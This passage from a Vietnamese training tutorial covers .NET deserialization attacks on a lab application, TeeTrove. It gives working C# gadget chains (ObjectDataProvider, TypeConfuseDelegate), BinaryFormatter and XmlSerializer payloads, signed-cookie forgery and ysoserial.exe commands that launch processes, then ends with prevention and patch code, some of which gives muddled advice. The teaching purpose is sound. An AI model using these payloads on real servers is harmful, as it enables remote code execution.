Trước khi tạo exploit, ta cần hiểu rõ cách hoạt động của payload trong trường hợp tương tự trong **DotNetNuke**. Payload trong đó chứa `ObjectDataProvider`, nhưng nó được bao bọc bởi thẻ `ExpandedWrapperOfXamlReaderObjectDataProvider`. Mặc dù ta có thể sử dụng `XmlSerializer` để tuần tự hóa dữ liệu, nhưng việc này không phải lúc nào cũng dễ dàng và đòi hỏi việc sử dụng thêm các lớp như `XamlReader` để thực thi mã.

**Tạo Payload**
Để tạo payload, ta cần phát triển một ứng dụng Console .NET để serial hóa `ObjectDataProvider` với `XamlWriter` thay vì sử dụng `XmlSerializer` trực tiếp. Dưới đây là mã ví dụ để serial hóa đối tượng `Process` và `ProcessStartInfo` để chạy lệnh `cmd /c calc` (mở máy tính).

```csharp
using System;
using System.Diagnostics;
using System.Windows.Data;
using System.Windows.Markup;

namespace TeeImportExploit
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "C:\\Windows\\System32\\cmd.exe";
            psi.Arguments = "/c calc";
            Process p = new Process();
            p.StartInfo = psi;

            ObjectDataProvider odp = new ObjectDataProvider();
            odp.ObjectInstance = p;
            odp.MethodName = "Start";
            string xaml = XamlWriter.Save(odp);

            Console.WriteLine(xaml);  // Output XAML string
        }
    }
}
```

Khi chạy chương trình này, nó sẽ tạo ra một chuỗi XAML chứa thông tin về đối tượng `Process` và các tham số của lệnh.

---

### **Chỉnh sửa và Kiểm tra Payload**

Tiếp theo, ta sẽ chỉnh sửa payload để có thể deserialization đúng cách trong ứng dụng TeeTrove. Lúc này, ta cần sử dụng `ExpandedWrapper` để đóng gói dữ liệu XAML và `ObjectDataProvider` trong một đối tượng mà `XmlSerializer` có thể hiểu được.

**Chỉnh sửa Mã với ExpandedWrapper**
```csharp
using System;
using System.IO;
using System.Text;
using System.Xml.Serialization;

namespace TeeImportExploit
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Tạo một payload XAML
            string payload = "<ObjectDataProvider xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' MethodName='Start'><MethodParameters><anyType xsi:type='xsd:string'>...</anyType></MethodParameters></ObjectDataProvider>";

            // Tạo đối tượng ExpandedWrapper và thêm payload vào
            ExpandedWrapper<XamlReader, ObjectDataProvider> expWrap = new ExpandedWrapper<XamlReader, ObjectDataProvider>();
            expWrap.ProjectedProperty0 = new ObjectDataProvider();
            expWrap.ProjectedProperty0.ObjectInstance = new XamlReader();
            expWrap.ProjectedProperty0.MethodName = "Parse";
            expWrap.ProjectedProperty0.MethodParameters.Add(payload);

            // Serialize đối tượng ExpandedWrapper với XmlSerializer
            MemoryStream ms = new MemoryStream();
            XmlSerializer xmlSerializer = new XmlSerializer(expWrap.GetType());
            xmlSerializer.Serialize(ms, expWrap);

            // Kiểm tra kết quả
            Console.WriteLine(Encoding.ASCII.GetString(ms.ToArray()));
        }
    }
}
```

Kết quả của mã trên sẽ là một chuỗi XML hoàn chỉnh chứa đối tượng `ExpandedWrapper`, có thể được deserialization thành một đối tượng `XamlReader` và thực thi mã.

---

### **Kiểm tra và Xác minh Payload**

Cuối cùng, ta sử dụng `XmlSerializer` để kiểm tra xem payload có thể deserialization đúng cách và thực thi mã không. Sau khi payload được deserialization, quá trình chạy lệnh `notepad.exe` hoặc `cmd.exe` sẽ được kích hoạt, chứng tỏ rằng lỗ hổng đã bị khai thác thành công.

**Ví dụ về chuỗi XML đã tuần tự hóa**:
```xml
<?xml version="1.0"?>
<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <ProjectedProperty0>
    <ObjectInstance xsi:type="XamlReader" />
    <MethodName>Parse</MethodName>
    <MethodParameters>
      <anyType xsi:type="xsd:string">...</anyType>
    </MethodParameters>
  </ProjectedProperty0>
</ExpandedWrapperOfXamlReaderObjectDataProvider>
```

---

### **Tấn công và Exploit**

Khi ta gửi payload này qua `XmlSerializer` trong ứng dụng TeeTrove, nó sẽ dẫn đến việc thực thi mã độc (ví dụ: mở máy tính). Kết quả này chứng tỏ rằng lỗ hổng đã được khai thác thành công, cho phép kẻ tấn công thực thi mã tùy ý trên hệ thống.

---

# 8. Loại tiện ích ConfuseDelegate

### Giới thiệu
Trong hai ví dụ khai thác trước, chúng ta đã sử dụng gadget `ObjectDataProvider`, nhưng thực tế có rất nhiều gadget khác tồn tại và liên tục được phát hiện. Hôm nay, chúng ta sẽ tìm hiểu về một gadget khác có tên là `TypeConfuseDelegate`.

### TypeConfuseDelegate là gì?
`TypeConfuseDelegate` là một gadget khai thác deserialization trong .NET Framework, lần đầu tiên được James Forshaw tiết lộ trong bài đăng trên blog của Google Project Zero. Mã nguồn của nó khá ngắn gọn, nhưng có thể sẽ khó hiểu lần đầu tiên, vì vậy hãy cùng phân tích cách hoạt động của nó.

### Cách hoạt động của TypeConfuseDelegate
Điều đầu tiên chúng ta cần hiểu là gadget này bắt đầu với một lớp có tên là `ComparisonComparer`, một lớp `internal` và `serializable` trong lớp `Comparer`. Lớp `ComparisonComparer` kế thừa lớp `Comparer` và có một thuộc tính `Comparison<T>` bên trong. 

`Comparison<T>` là một loại delegate đặc biệt, có nghĩa là nó tham chiếu đến một phương thức khác. Cụ thể, `Comparison<T>` là một delegate trả về kiểu `int` và có hai tham số kiểu `T`:

```csharp
public delegate int Comparison<in T>(T x, T y);
```

Điều quan trọng là trong phương thức `Compare`, ta thấy delegate này được gọi. Vậy nếu ta có thể tạo ra một phương thức được delegate trong lớp `ComparisonComparer` và chỉ định `Process.Start` làm phương thức so sánh, thì mỗi khi phương thức `Compare` được gọi, `Process.Start` sẽ được kích hoạt.

### Kỹ thuật lách qua ràng buộc kiểu dữ liệu
Mặc dù `ComparisonComparer` là lớp `internal` trong `Comparer` và không thể được khởi tạo từ các lớp khác ngoài `Comparer`, nhưng nó được cung cấp qua phương thức `Comparer.Create`, cho phép ta tạo ra một đối tượng `ComparisonComparer`.

Vấn đề tiếp theo là phương thức `Comparison` yêu cầu một phương thức trả về kiểu `int`, trong khi `Process.Start` lại trả về kiểu `Process`. Tuy nhiên, ta có thể khai thác một vấn đề lâu dài trong .NET Framework, nơi ràng buộc kiểu không luôn được thi hành, và thay thế một phương thức trong một đối tượng `MulticastDelegate` bằng một phương thức trả về kiểu khác, trong trường hợp này là `Process.Start`.

### Các bước trong mã khai thác
1. **Tạo `Comparison<T>` Delegate với `string.Compare`:**
   ```csharp
   Delegate stringCompare = new Comparison<string>(string.Compare);
   ```

2. **Tạo `MulticastDelegate` bằng cách kết hợp hai phương thức `string.Compare`:**
   ```csharp
   Comparison<string> multicastDelegate = (Comparison<string>)MulticastDelegate.Combine(stringCompare, stringCompare);
   ```

3. **Tạo `ComparisonComparer` bằng `Comparer.Create` và truyền `multicastDelegate`:**
   ```csharp
   IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);
   ```

4. **Truy cập trường `_invocationList` trong `MulticastDelegate` và thay thế một phương thức với `Process.Start`:**
   ```csharp
   FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
   object[] invoke_list = multicastDelegate.GetInvocationList();
   invoke_list[1] = new Func<string, string, Process>(Process.Start);
   fi.SetValue(multicastDelegate, invoke_list);
   ```

5. **Tạo một `SortedSet` với `ComparisonComparer` và thêm các chuỗi sẽ được truyền vào `Process.Start`:**
   ```csharp
   SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
   sortedSet.Add("/c calc");
   sortedSet.Add("C:\\Windows\\System32\\cmd.exe");
   ```

Kết quả của việc chạy gadget này là một cửa sổ máy tính (calculator) sẽ xuất hiện, và như chúng ta đã biết, phương thức `Compare` sẽ được gọi khi quá trình deserialization xảy ra.

---
# 9. Ví dụ 3: Khai thác lỗ hổng BinaryFormatter

### Khám Phá Lỗ Hổng
Trong ví dụ này, chúng ta sẽ tìm hiểu một lỗ hổng deserialization khác, tập trung vào cơ chế xác thực của ứng dụng TeeTrove. Cơ chế xác thực của ứng dụng sử dụng `BinaryFormatter` để thực hiện deserialization, điều này tạo ra một lỗ hổng bảo mật nghiêm trọng. Trong đoạn mã dưới đây, chúng ta thấy rằng `BinaryFormatter` được sử dụng để deserialize một phần của `authCookie`, một giá trị được lưu trữ trong cookie `TTAUTH`.

`BinaryFormatter` đã bị xác nhận là không an toàn, và Microsoft cũng đã cảnh báo các nhà phát triển về việc sử dụng nó. Một tìm kiếm đơn giản trên Google hoặc xem tài liệu của Microsoft sẽ xác nhận điều này.

### Phát Triển Khai Thác
Chúng ta biết rằng việc sử dụng `BinaryFormatter` để deserialize dữ liệu người dùng là không an toàn. Bây giờ, chúng ta sẽ tạo một dự án mới trong Visual Studio và phát triển một exploit có thể khai thác lỗ hổng này.

Lần này, gadget `ObjectDataProvider` mà chúng ta sử dụng trước đó sẽ không hoạt động. Tuy nhiên, chúng ta có thể sử dụng gadget `TypeConfuseDelegate` mà chúng ta đã thảo luận trong phần trước.

**Mã gadget `TypeConfuseDelegate`**:

```csharp
// TypeConfuseDelegate gadget
Delegate stringCompare = new Comparison<string>(string.Compare);
Comparison<string> multicastDelegate = (Comparison<string>)MulticastDelegate.Combine(stringCompare, stringCompare);
IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);
FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
object[] invoke_list = multicastDelegate.GetInvocationList();
invoke_list[1] = new Func<string, string, Process>(Process.Start);
fi.SetValue(multicastDelegate, invoke_list);
SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
sortedSet.Add("/c calc");
sortedSet.Add("C:\\Windows\\System32\\cmd.exe");
```

Bây giờ, chúng ta sẽ serialize đối tượng `SortedSet` này với `BinaryFormatter` và xuất kết quả dưới dạng chuỗi base64:

```csharp
// Serialize with BinaryFormatter (to base64 string)
MemoryStream ms = new MemoryStream();
BinaryFormatter bf = new BinaryFormatter();
bf.Serialize(ms, sortedSet);
Console.WriteLine(Convert.ToBase64String(ms.ToArray()));
```

Khi chạy chương trình, chúng ta thấy máy tính (calculator) được khởi động và chuỗi base64 của `SortedSet` được in ra. Để kiểm tra rằng payload sẽ hoạt động khi deserialization, chúng ta có thể thử sử dụng đoạn mã sau để kiểm tra:

```csharp
string payload = "AAEAAAD/////AQAAAAAAAAAM<SNIP>";
BinaryFormatter bf = new BinaryFormatter();
bf.Deserialize(new MemoryStream(Convert.FromBase64String(payload)));
```

Như mong đợi, `SortedSet` được deserialized và máy tính (calculator) sẽ được khởi động.

### Khai Thác TeeTrove
Bây giờ, chúng ta biết cách khai thác `BinaryFormatter`, hãy điều chỉnh payload để hoạt động với ứng dụng TeeTrove. Lúc này, chúng ta không thể chỉ sao chép-paste cookie chứa payload và hy vọng nó sẽ hoạt động, vì dữ liệu đã được xác thực trước khi deserialization diễn ra.

Chúng ta cần tìm hiểu cách thức xác thực cookie và cách để vượt qua kiểm tra này. Trong mã decompiled của `AuthCookieUtil`, chúng ta thấy phương thức `validateSignedCookie`. Phương thức này tách chuỗi cookie thành hai phần được phân tách bởi dấu `"."` và so sánh phần thứ hai với chuỗi được tạo ra từ phương thức `createSHA256HashB64`, sử dụng phần đầu tiên của cookie làm đầu vào. Nếu hai giá trị này khớp, phương thức trả về `true`, và ngược lại.

### Bước Xác Thực Cookie
Vì chúng ta biết giá trị của chuỗi bí mật `AUTH_COOKIE_SECRET` và có quyền kiểm soát đầy đủ cookie, chúng ta có thể giả mạo cookie hợp lệ bằng cách sử dụng thông tin này.

Dưới đây là cách sửa đổi mã khai thác để tạo một cookie đã ký hợp lệ:

```csharp
private static readonly string AUTH_COOKIE_SECRET = "916344019f88b8d93993afa72b593b9c";

private static string createSHA256HashB64(string session_b64)
{
    SHA256 s256 = SHA256.Create();
    byte[] hash = s256.ComputeHash(Encoding.ASCII.GetBytes(session_b64 + AUTH_COOKIE_SECRET));
    return Convert.ToBase64String(hash);
}
```

Tiếp theo, chúng ta sửa đổi phương thức chính để thay vì chỉ in kết quả chuỗi base64, nó sẽ truyền payload vào phương thức `createSHA256HashB64` để tạo ra một cookie hợp lệ:

```csharp
// Serialize and base64 encode the payload
bf.Serialize(ms, sortedSet);
string payload_b64 = Convert.ToBase64String(ms.ToArray());

// Turn payload into a signed cookie
string hash_b64 = createSHA256HashB64(payload_b64);
Console.WriteLine(payload_b64 + "." + hash_b64);
```

Khi chạy mã này, chúng ta thấy máy tính được khởi động và sau đó là chuỗi base64 của payload, tiếp theo là dấu `"."` và chuỗi base64 của hash SHA256.

### Sử Dụng Cookie Với Ứng Dụng TeeTrove
Bây giờ, chúng ta thử sử dụng giá trị này với cookie xác thực trong TeeTrove (`TTAUTH`). Lần này, chúng ta sẽ thay đổi payload để thay vì mở máy tính, payload sẽ mở Notepad. Sau đó, chúng ta có thể thiết lập breakpoint trong dnSpy để kiểm tra lỗi nếu có.

Sau khi đăng nhập vào ứng dụng với thông tin tài khoản `pentest:pentest`, chúng ta thay thế cookie `TTAUTH` bằng payload của chúng ta. Trong dnSpy, chúng ta sẽ hit breakpoint và khi tiếp tục, chúng ta thấy rằng phương thức `validateSignedCookie` trả về `true`, có nghĩa là ứng dụng sẽ tiếp tục với quá trình deserialization.

Khi quá trình deserialization hoàn tất, chúng ta sẽ thấy Notepad được mở như một tiến trình con của `w3wp.exe` trong Process Explorer. Như vậy, chúng ta đã khai thác thành công lỗ hổng thứ ba này!

---
# 10. Tự động hóa khai thác với YSoSerial.NET

### Giới thiệu
Trong các phần trước, chúng ta đã phân tích thủ công các gadget deserialization và phát triển các lỗ hổng trên hai ứng dụng .NET Framework, bao gồm ba khai thác lỗ hổng deserialization đối với TeeTrove. Mặc dù việc thực hiện thủ công rất phức tạp, nhưng hiểu cách tấn công theo cách thủ công là rất quan trọng trước khi sử dụng công cụ tự động, vì công cụ có thể không luôn hoạt động chính xác hoặc có thể có những điều kiện mà công cụ không xử lý được, như là trường hợp của TeeTrove.

**YSoSerial.NET** là một công cụ mã nguồn mở có thể được sử dụng để tạo payload cho các lỗ hổng deserialization trong .NET. Công cụ này được tạo ra bởi Alvaro Muñoz, người đã tham gia vào bài thuyết trình "Friday the 13th JSON Attacks" tại BlackHat 2017.

### Cách sử dụng YSoSerial.NET
Việc sử dụng công cụ này khá đơn giản. Bạn chỉ cần tải phiên bản mới nhất từ trang Releases và giải nén tệp ZIP sau khi tải về. Cách sử dụng được mô tả trong tệp `README.md` của kho mã nguồn, nhưng các tham số quan trọng nhất là:
- `-f` để chỉ định Formatter, ví dụ: `Json.NET`, `XmlSerializer`, `BinaryFormatter`.
- `-g` để chỉ định Gadget, ví dụ: `ObjectDataProvider`, `TypeConfuseDelegate`.
- `-c` để chỉ định Command, ví dụ: `notepad`.
- `-o` để chỉ định chế độ xuất, ví dụ: `Base64` hoặc `Raw` cho dữ liệu văn bản.

Câu lệnh mẫu:
```
.\ysoserial.exe -f [Formatter] -g [Gadget] -c [Command] -o [Output]
```

YSoSerial.NET hỗ trợ nhiều gadget và formatter hơn so với các ví dụ mà chúng ta đã thảo luận, tuy nhiên cách thức hoạt động của chúng đều tương tự nhau. Nếu bạn muốn tìm hiểu thêm, YSoSerial.NET là mã nguồn mở và có nhiều bài viết/blog chi tiết về các kỹ thuật sử dụng công cụ này.

### Ví dụ 1: JSON, "Remember Me" Cookie
Chúng ta sẽ xem xét cách tạo payload cho lỗ hổng đầu tiên mà chúng ta khai thác: cookie "Remember Me", được (de)serialize sử dụng `Json.NET`. Câu lệnh sẽ giống như sau:
```
PS C:\htb> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "notepad" -o Raw
```
Kết quả đầu ra sẽ tương tự như payload mà chúng ta phát triển thủ công trước đó:
```json
{
  '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
  'MethodName':'Start',
  'MethodParameters':{
    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
    '$values':['cmd', '/c notepad']
  },
  'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
Khi sao chép và dán payload này vào cookie `TTREMEMBER` trong TeeTrove, chúng ta sẽ thấy rằng một tiến trình `notepad.exe` được khởi động như mong đợi.

### Ví dụ 2: XML, Tính năng Tee Import
Trong ví dụ này, chúng ta sẽ sử dụng YSoSerial.NET để tạo payload cho lỗ hổng thứ hai liên quan đến tính năng nhập khẩu của TeeTrove, nơi dữ liệu XML được sử dụng để deserialization với `XmlSerializer`. Câu lệnh sẽ thay đổi formatter từ `Json.Net` thành `XmlSerializer`:
```
PS C:\htb> .\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "notepad" -o Raw
```
Kết quả đầu ra YSoSerial.NET cung cấp sẽ tương tự như payload thủ công, nhưng lần này dữ liệu XML sẽ được bọc trong một `ResourceDictionary`. Tuy nhiên, trong trường hợp này, chúng ta không thể chỉ sao chép và dán payload vì nó cần được chỉnh sửa thêm, như đã được giải thích trong phần trước về việc phải đổi tên các node để phù hợp với yêu cầu của ứng dụng TeeTrove.

### Ví dụ 3: Binary, Authentication Cookie
Cuối cùng, chúng ta sẽ sử dụng YSoSerial.NET để khai thác cookie xác thực, nơi `BinaryFormatter` được sử dụng để (de)serialization. Câu lệnh tạo payload cho `BinaryFormatter` rất đơn giản:
```
PS C:\htb> .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'notepad' -o base64
```
Tuy nhiên, như bạn có thể mong đợi, payload này sẽ không hoạt động do cơ chế xác thực cookie trước khi deserialization. Payload này cần phải được điều chỉnh để phù hợp với TeeTrove, nhưng điều này không quá khó khi chúng ta có mã nguồn decompiled của ứng dụng giúp chúng ta trong quá trình phát triển. Mã nguồn bổ sung để chuyển đổi payload YSoSerial.NET thành một cookie hợp lệ như sau:

```csharp
private static readonly string AUTH_COOKIE_SECRET = "916344<SNIP>";
private static string createSHA256HashB64(string session_b64)
{
    // Mã hóa SHA256 hash ở đây
}

static void Main(string[] args)
{
    string ysoserial_payload_b64 = "AAEAAAD/////AQAAAAAAA<SNIP>";
    string authCookieVal = ysoserial_payload_b64 + "." + createSHA256HashB64(ysoserial_payload_b64);
    Console.WriteLine(authCookieVal);
}
```

Với chương trình ngắn gọn này để biến đổi payload YSoSerial.NET thành một payload có thể sử dụng trong TeeTrove, việc khai thác sẽ hoạt động như mong đợi. Tuy nhiên, như đã đề cập trước đó, việc hiểu cách thức hoạt động của các cuộc tấn công là rất quan trọng để chúng ta có thể điều chỉnh payload sao cho phù hợp trong các tình huống cụ thể mà chúng ta gặp phải.

---
# 11. Ngăn chặn các lỗ hổng Deserialization

**Giới thiệu**  
Khi đã đề cập đến việc đánh giá lỗ hổng và phát triển khai thác, chúng ta sẽ chuyển sang cái nhìn từ phía người bảo vệ/phát triển và thảo luận về cách ngăn ngừa các lỗ hổng deserialization.

#### Hướng dẫn ngăn ngừa lỗ hổng deserialization

1. **Tránh deserialization dữ liệu người dùng**  
   Cách hiệu quả nhất để ngăn ngừa lỗ hổng deserialization là không bao giờ deserialization dữ liệu người dùng. Nếu kẻ tấn công không thể kiểm soát dữ liệu được deserialized, thì không có payload nào có thể được truyền vào phương thức deserialization.

2. **Tránh deserialization không cần thiết**  
   Đôi khi không cần phải sử dụng serialization để lưu trữ dữ liệu. Ví dụ, mã thông báo "Remember Me" trong TeeTrove có thể chỉ là một giá trị mã hóa, điều này không yêu cầu deserialization.

3. **Sử dụng cơ chế serialization an toàn**  
   Tránh sử dụng các cơ chế serialization như JWT hay chỉ JSON thô, đặc biệt là `BinaryFormatter`, vốn đã bị phát hiện có nhiều vấn đề. Đối với .NET, Microsoft khuyến nghị sử dụng các bộ serializer sau:
   - `XmlSerializer` cho XML
   - `DataContractSerializer` cho XML
   - `BinaryReader` và `BinaryWriter` cho XML và JSON
   - `System.Text.Json` cho JSON.

   Tuy nhiên, chỉ dựa vào các lớp này không đảm bảo loại bỏ hoàn toàn lỗ hổng deserialization. Ví dụ, lỗ hổng thứ hai trong TeeTrove đã lợi dụng `XmlSerializer`.

4. **Sử dụng loại đối tượng rõ ràng**  
   Nhiều serializer trong .NET cho phép lập trình viên chỉ định rõ ràng loại đối tượng khi deserialization, giúp ngăn chặn việc deserialization các đối tượng không mong muốn. Ví dụ, với `XmlSerializer`, một loại đối tượng cần được truyền vào trong constructor:
   ```csharp
   XmlSerializer xs = new XmlSerializer(typeof(Person));
   Person p = (Person)xs.Deserialize(...);
   ```

5. **Sử dụng dữ liệu đã ký**  
   Việc ký dữ liệu đã serialization để người dùng có thể sửa đổi là một cơ chế bảo vệ mạnh mẽ giúp ngăn ngừa khai thác. Ví dụ, cookie xác thực trong TeeTrove được ký với một khóa bí mật, và nếu không có mã nguồn, chúng ta sẽ không thể tạo ra một cookie hợp lệ để deserialization.

   Khi lựa chọn thuật toán để ký dữ liệu, cần xem xét những thuật toán nào có độ bảo mật cao hơn. Ví dụ, một hash MD5 có thể bị tấn công dễ dàng.

6. **Nguyên tắc quyền hạn tối thiểu (PoLP)**  
   Cuối cùng, việc chạy các máy chủ web tuân thủ Nguyên tắc quyền hạn tối thiểu là một thực hành bảo mật tốt. Khi một kẻ tấn công khai thác lỗ hổng deserialization và có thể thực thi mã trên máy chủ web, việc tuân thủ PoLP có thể tạo ra sự khác biệt lớn trong việc giới hạn thiệt hại (ví dụ, rò rỉ cơ sở dữ liệu) thay vì gây thiệt hại nghiêm trọng hơn (ví dụ, xâm nhập toàn bộ Active Directory).

---

### Vá Lỗ Hổng Deserialization

**Giới thiệu**  
Sau khi đã thảo luận về cách ngăn ngừa lỗ hổng deserialization, chúng ta sẽ chuyển sang cách vá lỗ hổng này trong TeeTrove.

#### Ví dụ 1: JSON, Cookie "Remember Me"

Để vá tính năng "Remember Me", chúng ta sẽ thay đổi cách lưu trữ dữ liệu từ serialization thành JWT (JSON Web Token), giúp tránh deserialization và đồng thời ngăn ngừa việc sửa đổi dữ liệu.

- **Mã sửa đổi**:
  ```csharp
  private static readonly byte[] JWT_SECRET = Encoding.UTF8.GetBytes("Gc#623Fq234J!^dE");

  public static HttpCookie createCookie(CustomMembershipUser user)
  {
      string jwt = JwtBuilder.Create()
          .WithAlgorithm(new HMACSHA256Algorithm())
          .WithSecret(JWT_SECRET)
          .AddClaim("Username", user.Username)
          .AddClaim("RememberToken", user.RememberToken)
          .Encode();
      HttpCookie cookie = new HttpCookie(REMEMBER_ME_COOKIE_NAME, jwt);
      cookie.Secure = true;
      cookie.HttpOnly = true;
      cookie.Expires = DateTime.Now.AddDays(30);
      return cookie;
  }

  public static CustomMembershipUser validateCookieAndReturnUser(string cookie)
  {
      try
      {
          IDictionary<string, object> claims = JwtBuilder.Create()
              .WithAlgorithm(new HMACSHA256Algorithm())
              .WithSecret(JWT_SECRET)
              .MustVerifySignature()
              .Decode<IDictionary<string, object>>(cookie);
          CustomMembershipUser User = (CustomMembershipUser)Membership.GetUser(claims["Username"].ToString(), false);
          return (User.RememberToken.Equals(claims["Token"].ToString())) ? User : null;
      }
      catch (Exception)
      {
          return null;
      }
  }
  ```

#### Ví dụ 2: XML, Tính năng Tee Import

Trong ví dụ này, `XmlSerializer` được sử dụng và vấn đề duy nhất là loại đối tượng truyền vào có thể bị kiểm soát bởi người dùng. Bằng cách cứng hóa giá trị loại đối tượng, chúng ta có thể ngừng khai thác lỗ hổng này.

- **Mã sửa đổi**:
  ```csharp
  string xml = Request.Form["xml"];
  if (!xml.IsEmpty())
  {
      XmlSerializer xs = new XmlSerializer(typeof(Tee), new XmlRootAttribute("Tee"));
      try
      {
          // Deserialize xml here
      }
      catch (Exception e)
      {
          // Handle exception
      }
  }
  ```

#### Ví dụ 3: Binary, Cookie Xác Thực

Cuối cùng, thay vì sử dụng `BinaryFormatter`, ta có thể sử dụng `XmlSerializer` hoặc JWT để thay thế, với việc loại đối tượng được chỉ định rõ ràng trong quá trình deserialization.

- **Mã sửa đổi**:
  ```csharp
  XmlSerializer xs = new XmlSerializer(typeof(Session));
  Session session = null;
  try
  {
      MemoryStream ms = new MemoryStream(Convert.FromBase64String(authCookie.Value.Split('.')[0]));
      session = (Session)xs.Deserialize(ms);
  }
  catch (Exception)
  {
      // Handle exception
  }
  ```

Với những thay đổi này, tính năng xác thực sẽ không còn bị tấn công qua deserialization và dữ liệu sẽ được xử lý an toàn hơn.
